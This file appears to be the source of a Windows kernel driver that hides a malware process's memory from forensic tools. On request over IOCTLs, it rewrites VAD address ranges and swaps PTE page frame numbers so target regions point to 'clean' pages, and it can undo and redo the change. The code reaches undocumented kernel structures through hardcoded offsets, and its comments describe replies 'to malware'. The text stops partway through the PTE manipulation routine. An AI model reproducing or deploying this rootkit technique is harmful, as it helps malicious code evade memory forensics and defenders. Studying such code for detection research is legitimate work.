#include "ntddk.h"
#include "DriverKit.h"
#include <stdlib.h>

#define SIOCTL_TYPE 40000
#define IOCTL_DATA CTL_CODE( SIOCTL_TYPE, 0x800, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_UNDO_PTE CTL_CODE( SIOCTL_TYPE, 0x801, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_REDO_PTE CTL_CODE( SIOCTL_TYPE, 0x802, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)


DRIVER_INITIALIZE DriverEntry;
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS Function_IRP_MJ_CREATE(_In_ PDEVICE_OBJECT pDeviceObject, _In_ PIRP Irp);
NTSTATUS Function_IRP_MJ_CLOSE(_In_ PDEVICE_OBJECT pDeviceObject, _In_ PIRP Irp);
NTSTATUS Function_IRP_DEVICE_CONTROL(_In_ PDEVICE_OBJECT pDeviceObject, _In_ PIRP Irp);
DWORD64 FindProcessEPROC(_In_ int terminate_PID);
DWORD64 GetEprocessByImageFileName(_In_ PUNICODE_STRING name);
DWORD64 GetProcessVAD(_In_ DWORD64 eproc);
PMMVAD_SHORT FindVADbyMemoryRegion(_In_ DWORD64 vadRoot, _In_  DWORD64 startAddress, _In_  DWORD64 endAddress);
DWORD64 GetProcessDirBase(_In_ DWORD64 eproc);
PMMPTE GetPTEofVirtualAddress(_In_ DWORD64 eproc, _In_ DWORD64 address);
VOID PrintPTEbits(_In_ PMMPTE pte);
PMMPTE ManipulatePFNofPTE(_In_ PMMPTE targetPTE, _In_ PMMPTE cleanPTE);
PMMVAD_SHORT ManipulateVADRange(_In_ PMMVAD_SHORT targetVAD, _In_ PMMVAD_SHORT cleanVAD);
VOID OnProcessNotify(_In_ HANDLE ParentId, _In_ HANDLE ProcessId, _In_ BOOLEAN Create);
VOID ManipulateVAD(BOOLEAN VADPTE, BOOLEAN VAD);
VOID ManipulatePTEs(BOOLEAN VADPTE, BOOLEAN PTE);
VOID UndoVADManipulation(BOOLEAN VADPTE, BOOLEAN VAD);
VOID UndoPTEManipulation(BOOLEAN VADPTE, BOOLEAN PTE);


DWORD64				targetEPROC;
PMMVAD_SHORT		VADmanipulationTargetVAD;
PMMVAD_SHORT		VADPTEmanipulationTargetVAD;
ULONG				VADmanipulationOriginalStartingVpn;
ULONG				VADmanipulationOriginalEndingVpn;
ULONG				VADPTEmanipulationOriginalStartingVpn;
ULONG				VADPTEmanipulationOriginalEndingVpn;
PHIDING_INFO		pHidingInfo;
HIDING_INFO			hidingInfo;
ULONGLONG			PTEmanipulationOriginalPFNs[100];
ULONGLONG			VADPTEmanipulationOriginalPFNs[100];
BOOLEAN				dataReceived = FALSE;
BOOLEAN				VADManipulated = FALSE;
BOOLEAN				PTEsManipulated = FALSE;
BOOLEAN				VADPTEsManipulated = FALSE;


NTSTATUS DriverEntry(  
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING RegistryPath
)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS            status;
	PDEVICE_OBJECT      devObj;
	UNICODE_STRING      devName;
	UNICODE_STRING      linkName;

	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "DriverKit: DriverEntry"));

	// Initialize the UNICODE device name.  This will be the "native NT" name
	// for our device.
	RtlInitUnicodeString(&devName, L"\\Device\\DriverKit");

	// create device object and device extension
	status = IoCreateDevice(DriverObject,
		0,
		&devName,
		FILE_DEVICE_NOTHING,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&devObj);

	// make the device accessible from user-mode applications.
	RtlInitUnicodeString(&linkName, L"\\??\\DriverKit");
	status = IoCreateSymbolicLink(&linkName, &devName);

	if (!NT_SUCCESS(status)) {
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "IoCreateSymbolicLink failed.  Status = 0x%x\n", status));
	}


	// add dispatch function entrypoints
	DriverObject->DriverUnload = DriverUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = Function_IRP_MJ_CREATE;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = Function_IRP_MJ_CLOSE;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = Function_IRP_DEVICE_CONTROL;
	 
	// set notify routine to catch malware process exit
	NTSTATUS notifyStatus;
	BOOLEAN Remove = FALSE;
	notifyStatus = PsSetCreateProcessNotifyRoutine(OnProcessNotify, Remove);
	if (!NT_SUCCESS(notifyStatus)) {
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nNOTIFY ROUTINE CREATION FAILED.  Status = 0x%llx\n", notifyStatus));
	}

	return status;
}


//
// Dispatch routines
//
VOID DriverUnload(
	_In_ PDRIVER_OBJECT DriverObject
)
{
	PDEVICE_OBJECT devObj;
	UNICODE_STRING linkName;

	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nDriverUnload: Entry\n\n"));

	// remove notify routine
	NTSTATUS notifyStatus;
	BOOLEAN Remove = TRUE;
	notifyStatus = PsSetCreateProcessNotifyRoutine(OnProcessNotify, Remove);
	if (!NT_SUCCESS(notifyStatus)) {
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nNotify routine could not be removed.  status = 0x%x\n", notifyStatus));
	}
	
	devObj = DriverObject->DeviceObject;

	if (!devObj) {
		return;
	}
	else {
		// Delete the device object
		IoDeleteDevice(devObj);
	}

	RtlInitUnicodeString(&linkName, L"\\??\\DriverKit");

	IoDeleteSymbolicLink(&linkName);

	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nDriverUnload: Exit\n\n"));
}

NTSTATUS Function_IRP_MJ_CREATE(
	_In_ PDEVICE_OBJECT pDeviceObject,
	_In_ PIRP Irp
)
{
	UNREFERENCED_PARAMETER(pDeviceObject);
	UNREFERENCED_PARAMETER(Irp);
	DbgPrint("IRP MJ CREATE received.");
	return STATUS_SUCCESS;
}

NTSTATUS Function_IRP_MJ_CLOSE(
	_In_ PDEVICE_OBJECT pDeviceObject,
	_In_ PIRP Irp
)
{
	UNREFERENCED_PARAMETER(pDeviceObject);
	UNREFERENCED_PARAMETER(Irp);
	DbgPrint("IRP MJ CLOSE received.");
	return STATUS_SUCCESS;
}


NTSTATUS Function_IRP_DEVICE_CONTROL(
	_In_ PDEVICE_OBJECT pDeviceObject,
	_In_ PIRP Irp
)
{
	UNREFERENCED_PARAMETER(pDeviceObject);
	PIO_STACK_LOCATION	pIoStackLocation;
	PCHAR				answerToData = "Data received";
	PCHAR				answerToUndo = "Undo received";
	PCHAR				answerToRedo = "Redo received";
	PVOID				pBuf = Irp->AssociatedIrp.SystemBuffer;



	pIoStackLocation = IoGetCurrentIrpStackLocation(Irp);
	switch (pIoStackLocation->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_DATA:

		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nIOCTL DATA received.\n"));

		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Message received pBuf : %llx\n", pBuf));
		pHidingInfo = (PHIDING_INFO)pBuf;
		hidingInfo.PID = pHidingInfo->PID;
		hidingInfo.VADtargetStartAddress = pHidingInfo->VADtargetStartAddress;
		hidingInfo.VADtargetEndAddress = pHidingInfo->VADtargetEndAddress;
		hidingInfo.PTEtargetStartAddress = pHidingInfo->PTEtargetStartAddress;
		hidingInfo.PTEtargetEndAddress = pHidingInfo->PTEtargetEndAddress;
		hidingInfo.VADPTEtargetStartAddress = pHidingInfo->VADPTEtargetStartAddress;
		hidingInfo.VADPTEtargetEndAddress = pHidingInfo->VADPTEtargetEndAddress;
		hidingInfo.cleanStartAddress = pHidingInfo->cleanStartAddress;
		hidingInfo.cleanEndAddress = pHidingInfo->cleanEndAddress;
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PID : %d\n", hidingInfo.PID));
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "VAD start : %llx\n", hidingInfo.VADtargetStartAddress));
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "VAD end : %llx\n", hidingInfo.VADtargetEndAddress));
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PTE start : %llx\n", hidingInfo.PTEtargetStartAddress));
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PTE end : %llx\n", hidingInfo.PTEtargetEndAddress));
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "VAD/PTE start : %llx\n", hidingInfo.VADPTEtargetStartAddress));
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "VAD/PTE end : %llx\n", hidingInfo.VADPTEtargetEndAddress));
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "CLEAN start : %llx\n", hidingInfo.cleanStartAddress));
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "CLEAN end : %llx\n", hidingInfo.cleanEndAddress));

		if (hidingInfo.PID) {
			targetEPROC = FindProcessEPROC(hidingInfo.PID);

			if (targetEPROC == 0x00000000)
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nPID not Found\n\n"));
			else {
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nFound EPROCESS : 0x%llx\n\n", targetEPROC));

				// VAD Manipulation on VAD target memory
				ManipulateVAD(FALSE, TRUE);
				VADManipulated = TRUE;
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nVAD manipulated - VAD target memory\n\n"));

				// PTE Manipulation on PTE target memory
				ManipulatePTEs(FALSE, TRUE);
				PTEsManipulated = TRUE;
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nPTEs manipulated - PTE target memory\n\n"));

				// VAD and PTE manipulation on VAD/PTE target memory
				ManipulateVAD(TRUE, FALSE);
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nVAD manipulated - VAD/PTE target memory\n\n"));
				ManipulatePTEs(TRUE, FALSE);
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nPTEs manipulated - VAD/PTE target memory\n\n"));
				VADPTEsManipulated = TRUE;

			}

			dataReceived = TRUE;

			// send answer to malware
			RtlZeroMemory(pBuf, pIoStackLocation->Parameters.DeviceIoControl.InputBufferLength);
			RtlCopyMemory(pBuf, answerToData, strlen(answerToData));

			// Finish the I/O operation by simply completing the packet and returning
			// the same status as in the packet itself.
			Irp->IoStatus.Status = STATUS_SUCCESS;
			Irp->IoStatus.Information = strlen(answerToData);
			IoCompleteRequest(Irp, IO_NO_INCREMENT);
		}

		break;

	case IOCTL_UNDO_PTE:

		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nIOCTL UNDO received.\n"));

		// undo PTE manipulation of PTE target memory
		if (PTEsManipulated == TRUE) {
			UndoPTEManipulation(FALSE, TRUE);
			PTEsManipulated = FALSE;
		}
		// undo PTE manipulation of VAD/PTE target memory
		if (VADPTEsManipulated == TRUE) {
			UndoPTEManipulation(TRUE, FALSE);
			VADPTEsManipulated = FALSE;
		}

		// send answer to malware
		RtlZeroMemory(pBuf, pIoStackLocation->Parameters.DeviceIoControl.InputBufferLength);
		RtlCopyMemory(pBuf, answerToUndo, strlen(answerToUndo));

		// Finish the I/O operation by simply completing the packet and returning
		// the same status as in the packet itself.
		Irp->IoStatus.Status = STATUS_SUCCESS;
		Irp->IoStatus.Information = strlen(answerToUndo);
		IoCompleteRequest(Irp, IO_NO_INCREMENT);
		break;

	case IOCTL_REDO_PTE:

		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nIOCTL REDO received.\n"));

		// redo PTE manipulation of PTE target memory
		if (PTEsManipulated == FALSE) {
			ManipulatePTEs(FALSE, TRUE);
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nPTEs manipulated - PTE target memory.\n"));
			PTEsManipulated = TRUE;
		}
		// redo PTE manipulation of VAD/PTE target memory
		if (VADPTEsManipulated == FALSE) {
			ManipulatePTEs(TRUE, FALSE);
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nPTEs manipulated - VAD/PTE target memory.\n"));
			VADPTEsManipulated = TRUE;
		}

		// send answer to malware
		RtlZeroMemory(pBuf, pIoStackLocation->Parameters.DeviceIoControl.InputBufferLength);
		RtlCopyMemory(pBuf, answerToRedo, strlen(answerToRedo));

		// Finish the I/O operation by simply completing the packet and returning
		// the same status as in the packet itself.
		Irp->IoStatus.Status = STATUS_SUCCESS;
		Irp->IoStatus.Information = strlen(answerToRedo);
		IoCompleteRequest(Irp, IO_NO_INCREMENT);
		break;
	}

	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nIOCTL Finished\n\n"));
	return STATUS_SUCCESS;
}



//
// Process functions
//

DWORD64 FindProcessEPROC(
	_In_ int terminatePID
)
{
	DWORD64 eproc = 0x00000000;
	int currentPID = 0;
	int startPID = 0;
	int iCount = 0;
	PLIST_ENTRY plistActiveProcs;

	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nFindProcessEPROC: Entry\n\n"));

	if (terminatePID == 0) {
		return terminatePID;
	}
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nSearch EPROCESS by Id: %d\n\n", terminatePID));
	// Get the address of the current EPROCESS
	eproc = (DWORD64)PsGetCurrentProcess();
	startPID = *((int*)(eproc + 0x2e8));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nCurrent Process Id: %d\n\n", startPID));
	currentPID = startPID;
	// compare PIDs and walk through the list
	for (;;)
	{
		if (terminatePID == currentPID)
		{
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nfound\n\n"));
			return eproc;// found
		}
		else if ((iCount >= 1) && (startPID == currentPID))
		{
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "not found"));
			return 0x00000000;
		}
		else { 
			// Advance in the list.
			plistActiveProcs = (LIST_ENTRY*)(eproc + 0x2f0);
			eproc = (DWORD64)plistActiveProcs->Flink;
			eproc = eproc - 0x2f0;
			currentPID = *((int*)(eproc + 0x2e8));
			iCount++; 
		}
	}
}

DWORD64 GetProcessVAD(
	_In_ DWORD64 eproc
) {
	DWORD64 vadRoot;

	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nSearching VAD of EPROCESS : 0x%llx \n\n", eproc));

	if (eproc == 0)
	{
		KdPrint(("\nProcess not found\n"));
		return 0x0;
	}

	vadRoot = *((DWORD64*)(eproc + 0x658));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nVADRoot : 0x%llx\n\n", vadRoot));

	return vadRoot;
}

VOID ManipulateVAD(BOOLEAN VADPTE, BOOLEAN VAD) {

	DWORD64				vadRoot;
	DWORD64				startAddress;
	DWORD64				endAddress;
	PMMVAD_SHORT		cleanVAD;

	// manipulation on VAD target memory
	if (VAD == TRUE) {

		if (hidingInfo.VADtargetStartAddress != 0x0000 && hidingInfo.VADtargetEndAddress != 0x0000) {
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\n---------------------------VAD Manipulation - VAD target memory------------------------\n\n"));

			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nVAD start address : 0x%llx\n", hidingInfo.VADtargetStartAddress));
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nVAD end address : 0x%llx\n\n", hidingInfo.VADtargetEndAddress));

			// get vad tree of eproc
			vadRoot = GetProcessVAD(targetEPROC);

			// find vad for target address range
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n---------------------------SEARCH TARGET VAD------------------------\n"));
			startAddress = hidingInfo.VADtargetStartAddress;
			endAddress = hidingInfo.VADtargetEndAddress;
			VADmanipulationTargetVAD = FindVADbyMemoryRegion(vadRoot, startAddress, endAddress);
			// save original address range of target VAD
			VADmanipulationOriginalStartingVpn = VADmanipulationTargetVAD->StartingVpn;
			VADmanipulationOriginalEndingVpn = VADmanipulationTargetVAD->EndingVpn;

			// find vad for clean address range
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n---------------------------SEARCH CLEAN VAD------------------------\n"));
			startAddress = hidingInfo.cleanStartAddress;
			endAddress = hidingInfo.cleanEndAddress;
			cleanVAD = FindVADbyMemoryRegion(vadRoot, startAddress, endAddress);


			DbgBreakPoint();
			// manipulate VAD range
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n---------------------------MANIPULATE VAD------------------------\n"));
			PMMVAD_SHORT manipulatedVAD = ManipulateVADRange(VADmanipulationTargetVAD, cleanVAD);
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nManipulated VAD: 0x%llx\n", manipulatedVAD));
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Manipulated Range:\n"));
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Start Address: 0x%llx\n", manipulatedVAD->StartingVpn));
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "End Address: 0x%llx\n", manipulatedVAD->EndingVpn));
			VADManipulated = TRUE;
			DbgBreakPoint();

		}
		else {
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nNo memory range for VAD manipulation\n"));
		}
	}

	// manipulation on VAD/PTE target memory
	if (VADPTE == TRUE) {
		if (hidingInfo.VADPTEtargetStartAddress != 0x0000 && hidingInfo.VADPTEtargetEndAddress != 0x0000) {

			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\n---------------------------VAD Manipulation - VAD/PTE target memory------------------------\n\n"));
		
			// VAD manipulation

			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nVAD start address : 0x%llx\n", hidingInfo.VADPTEtargetStartAddress));
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nVAD end address : 0x%llx\n\n", hidingInfo.VADPTEtargetEndAddress));

			// get vad tree of eproc
			vadRoot = GetProcessVAD(targetEPROC);

			// find vad for target address range
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n---------------------------SEARCH TARGET VAD------------------------\n"));
			startAddress = hidingInfo.VADPTEtargetStartAddress;
			endAddress = hidingInfo.VADPTEtargetEndAddress;
			VADPTEmanipulationTargetVAD = FindVADbyMemoryRegion(vadRoot, startAddress, endAddress);
			// save original address range of target VAD
			VADPTEmanipulationOriginalStartingVpn = VADPTEmanipulationTargetVAD->StartingVpn;
			VADPTEmanipulationOriginalEndingVpn = VADPTEmanipulationTargetVAD->EndingVpn;

			// find vad for clean address range
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n---------------------------SEARCH CLEAN VAD------------------------\n"));
			startAddress = hidingInfo.cleanStartAddress;
			endAddress = hidingInfo.cleanEndAddress;
			cleanVAD = FindVADbyMemoryRegion(vadRoot, startAddress, endAddress);


			// manipulate VAD range
			DbgBreakPoint();
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n---------------------------MANIPULATE VAD------------------------\n"));
			PMMVAD_SHORT manipulatedVAD = ManipulateVADRange(VADPTEmanipulationTargetVAD, cleanVAD);
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nManipulated VAD: 0x%llx\n", manipulatedVAD));
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Manipulated Range:\n"));
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Start Address: 0x%llx\n", manipulatedVAD->StartingVpn));
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "End Address: 0x%llx\n", manipulatedVAD->EndingVpn));
			DbgBreakPoint();	
		}
	}

}

PMMVAD_SHORT FindVADbyMemoryRegion(
	_In_ DWORD64 vadRoot,
	_In_ DWORD64 startAddress,
	_In_ DWORD64 endAddress
) {
	PMMADDRESS_NODE currentVad = (PMMADDRESS_NODE)vadRoot;
	PMMADDRESS_NODE child;
	PMMVAD_SHORT VpnCompareNode;
	DWORD64 startingAddressCurrentVAD;
	DWORD64 endAddressCurrentVAD;

	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nSearching VAD for region 0x%llx - 0x%llx \n\n", 
		startAddress, endAddress));
	
	for (;;) {
		VpnCompareNode = (PMMVAD_SHORT)currentVad;
		startingAddressCurrentVAD = ((DWORD64)VpnCompareNode->StartingVpn) << 12;
		endAddressCurrentVAD = ((DWORD64)VpnCompareNode->EndingVpn) << 12;

		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "searched startAddress : 0x%llx\n", startAddress));
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "current StartingVPN : 0x%llx\n", startingAddressCurrentVAD));
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "current EndingVPN : 0x%llx\n\n", endAddressCurrentVAD));
		
		// if startAddress is in range of current vad return current vad
		if ((startAddress >= startingAddressCurrentVAD) && (startAddress <= endAddressCurrentVAD)) {
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nFound VAD : 0x%llx\n", currentVad));
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "StartingVPN : 0x%llx\n", startingAddressCurrentVAD));
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "EndingVPN : 0x%llx\n\n", endAddressCurrentVAD));
			return (PMMVAD_SHORT)currentVad;
		}
		// if startAddress is lower than current vad startingVPN check left subtree
		else if (startAddress < startingAddressCurrentVAD) {
			child = currentVad->LeftChild;
			if (child != 0x0) {
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nSearching left child : 0x%llx\n\n", child));
				currentVad = child;
			}
			else {
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nNot found\n\n"));
				return 0x0;
			}
		}
		// if startAddress is greater than current vad endingVPN check right subtree
		else if (startAddress > endAddressCurrentVAD) {
			child = currentVad->RightChild;
			if (child != 0x0) {
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nSearching right child : 0x%llx\n\n", child));
				currentVad = child;
			}
			else {
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nNot found\n\n"));
				return 0x0;
			}
		}
	}
}

DWORD64 GetProcessDirBase(
	_In_ DWORD64 eproc
) {
	DWORD64	directoryTableBase;

	if (eproc == 0x0) {
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nEPROC should not be 0x0\n\n"));
		return 0x0;
	}

	//get DTB out of PCB
	directoryTableBase = *(DWORD64*)(eproc + 0x028);
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nDTB: 0x%llx\n\n", directoryTableBase));

	return directoryTableBase;
}

VOID PrintPTEbits(
	PMMPTE pte
) {
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nValid: %llu\n", pte->u.Hard.Valid));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Writable: %llu\n", pte->u.Hard.Writable));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Owner: %llu\n", pte->u.Hard.Owner));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "WriteThrough: %llu\n", pte->u.Hard.WriteThrough));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "CacheDisable: %llu\n", pte->u.Hard.CacheDisable));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Accessed: %llu\n", pte->u.Hard.Accessed));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Dirty: %llu\n", pte->u.Hard.Dirty));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "LargePage: %llu\n", pte->u.Hard.LargePage));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Global: %llu\n", pte->u.Hard.Global));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "CopyOnWrite: %llu\n", pte->u.Hard.CopyOnWrite));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Prototype: %llu\n", pte->u.Hard.Prototype));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "WriteSoftware: %llu\n", pte->u.Hard.WriteSoftware));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PageFrameNumber: 0x%llx\n", pte->u.Hard.PageFrameNumber));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "ReservedHardware: %llu\n", pte->u.Hard.ReservedHardware));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "ReservedSoftware: %llu\n", pte->u.Hard.ReservedSoftware));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "WsleAge: %llu\n", pte->u.Hard.WsleAge));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "WsleProtection: %llu\n", pte->u.Hard.WsleProtection));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "NoExecute: %llu\n", pte->u.Hard.NoExecute));
}

VOID ManipulatePTEs(BOOLEAN VADPTE, BOOLEAN PTE) {
	DWORD64				currentTargetAddress;
	DWORD64				currentCleanAddress;
	PMMPTE				targetPTE;
	PMMPTE				cleanPTE;

	// manipulation on PTE target memory
	if (PTE == TRUE) {
		if (hidingInfo.PTEtargetStartAddress != 0x0000 && hidingInfo.PTEtargetEndAddress != 0x0000) {
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\n---------------------------PTE Manipulation - PTE target memory------------------------\n\n"));

			// get virtual addresses from range
			currentCleanAddress = hidingInfo.cleanStartAddress;
			int pfnIndexCounter = 0;
			for (
				currentTargetAddress = hidingInfo.PTEtargetStartAddress;
				currentTargetAddress <= hidingInfo.PTEtargetEndAddress;
				// for large pages the value 0x1000 needs to be adjusted
				currentTargetAddress = currentTargetAddress + 0x1000
				) {

				// get PTE for virtual address
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n---------------------------SEARCH TARGET PTE------------------------\n"));
				targetPTE = GetPTEofVirtualAddress(targetEPROC, currentTargetAddress);
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nTarget PTE : 0x%llx\n", targetPTE));

				// save original PTE
				PTEmanipulationOriginalPFNs[pfnIndexCounter] = targetPTE->u.Hard.PageFrameNumber;

				// get PTE of clean memory page to mimic unsuspicious data at new PFN
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n---------------------------SEARCH CLEAN PTE------------------------\n"));
				cleanPTE = (PMMPTE)GetPTEofVirtualAddress(targetEPROC, currentCleanAddress);
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\nClean PTE : 0x%llx\n", cleanPTE));

				// show bitfields
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n---------------------------PTE BITFIELDS------------------------\n"));
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "\n\nTarget PTE Bitfields:\n"));
				KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PTE : 0x%llx\n", targetPTE));
				PrintPTEbits(targetPTE);
